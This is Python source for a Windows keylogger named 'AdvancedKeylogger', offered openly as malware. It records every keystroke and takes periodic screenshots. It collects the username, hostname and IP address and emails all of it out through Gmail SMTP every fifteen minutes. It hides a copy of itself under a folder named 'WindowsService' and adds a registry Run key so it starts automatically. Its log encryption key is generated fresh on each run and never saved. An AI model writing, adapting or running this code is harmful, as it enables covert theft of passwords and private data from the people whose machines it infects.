# key windows
import keyboard
import socket
import os
import platform
import smtplib
import base64
import shutil
import getpass
import winreg as reg
from cryptography.fernet import Fernet
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from threading import Semaphore, Timer
import pyscreenshot as ImageGrab

SEND_REPORT_EVERY = 900  # 15 minutes
EMAIL_ADDRESS = ""  # Enter Email
EMAIL_PASSWORD = ""  # Enter Password

# Encryption key generation
KEY = Fernet.generate_key()
CIPHER = Fernet(KEY)


class AdvancedKeylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)

    def encrypt_log(self, log):
        return CIPHER.encrypt(log.encode())

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    @staticmethod
    def sendmail(email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    @staticmethod
    def send_image(img_filename):
        img_data = open(img_filename, 'rb').read()
        msg = MIMEMultipart()
        msg['Subject'] = 'Screenshot'
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS

        text = MIMEText("Screenshot attached.")
        msg.attach(text)
        image = MIMEImage(img_data, name=os.path.basename(img_filename))
        msg.attach(image)

        s = smtplib.SMTP(host="smtp.gmail.com", port=587)
        s.starttls()
        s.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        s.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())
        s.quit()

    def screenshot(self):
        im = ImageGrab.grab()
        cwd = os.getcwd()
        path = os.path.join(cwd, "screenshot.png")
        im.save(path)
        self.send_image(path)
        os.remove(path)

    def report(self):
        self.screenshot()
        if self.log:
            encrypted_log = self.encrypt_log(self.log)
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, encrypted_log.decode())
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def computer_info(self):
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        user = getpass.getuser()

        mssg = f"""
        System Information
        ------------------
        User: {user}
        Architecture: {platform.architecture()[0]} {platform.architecture()[1]}
        Machine: {platform.machine()}
        System: {platform.system()} {platform.version()}
        Hostname: {hostname}
        IP Address: {IPAddr}
        """

        self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, mssg)

    def add_to_startup(self, file_path):
        try:
            key = reg.HKEY_CURRENT_USER
            key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
            open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
            reg.SetValueEx(open_key, "AdvancedKeylogger", 0, reg.REG_SZ, file_path)
            reg.CloseKey(open_key)
        except Exception as e:
            print(f"Error adding to startup: {e}")

    def hide_script(self):
        # Copy the script to a hidden location
        try:
            hidden_dir = os.path.join(os.getenv('APPDATA'), 'WindowsService')
            if not os.path.exists(hidden_dir):
                os.makedirs(hidden_dir)
            script_name = os.path.basename(__file__)
            hidden_path = os.path.join(hidden_dir, script_name)
            shutil.copyfile(__file__, hidden_path)
            self.add_to_startup(hidden_path)
        except Exception as e:
            print(f"Error hiding script: {e}")

    def start(self):
        self.hide_script()
        keyboard.on_release(callback=self.callback)
        self.computer_info()
        self.report()
        self.semaphore.acquire()


if __name__ == "__main__":
    keylogger = AdvancedKeylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
